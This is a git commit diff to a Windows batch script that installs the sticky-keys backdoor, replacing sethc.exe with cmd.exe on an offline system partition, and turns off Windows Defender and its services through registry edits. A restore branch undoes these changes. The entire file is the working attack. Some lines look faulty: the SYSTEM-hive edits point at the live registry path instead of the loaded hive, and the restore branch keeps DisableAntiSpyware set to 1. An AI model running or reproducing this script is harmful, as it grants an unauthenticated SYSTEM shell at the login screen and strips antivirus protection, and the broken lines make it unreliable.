600c71301f724d55f10116b6fb1383a1b7beb832
daboynb <106079917+daboynb@users.noreply.github.com>
2024-04-04 21:48:39 +0200

    Update sticky_keys.bat

--- sticky_keys/sticky_keys.bat
+++ sticky_keys/sticky_keys.bat
@@ -13,43 +13,43 @@ IF %M%==1 GOTO ENABLE
 IF %M%==2 GOTO DISABLE
 
 :ENABLE
-copy %SYSPART%\windows\system32\sethc.exe %SYSPART%\
-copy /y %SYSPART%\windows\system32\cmd.exe %SYSPART%\windows\system32\sethc.exe
+move "%SYSPART%\windows\system32\sethc.exe" "%SYSPART%\windows\system32\sethc.exe.bak"
+copy /y "%SYSPART%\windows\system32\cmd.exe" "%SYSPART%\windows\system32\sethc.exe"
 
 rem disable defender
-reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SOFTWARE
+reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SOFTWARE"
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
-reg unload HKLM\temp-hive
+reg unload "HKLM\temp-hive"
 
-reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SYSTEM
+reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SYSTEM"
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 4 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
-reg unload HKLM\temp-hive
+reg unload "HKLM\temp-hive"
 
 echo "Completed"
 pause
 exit
 
 :DISABLE
-copy /y %SYSPART%\sethc.exe %SYSPART%\windows\system32\sethc.exe
+move /y "%SYSPART%\windows\system32\sethc.exe.bak" "%SYSPART%\windows\system32\sethc.exe"
 
 rem enable defender
-reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SOFTWARE
+reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SOFTWARE"
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0 /f
-reg unload HKLM\temp-hive
+reg unload "HKLM\temp-hive"
 
-reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SYSTEM
+reg load "HKLM\temp-hive" "%SYSPART%\windows\system32\config\SYSTEM"
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 2 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 2 /f
-reg unload HKLM\temp-hive
+reg unload "HKLM\temp-hive"
 
 echo "Completed"
 pause
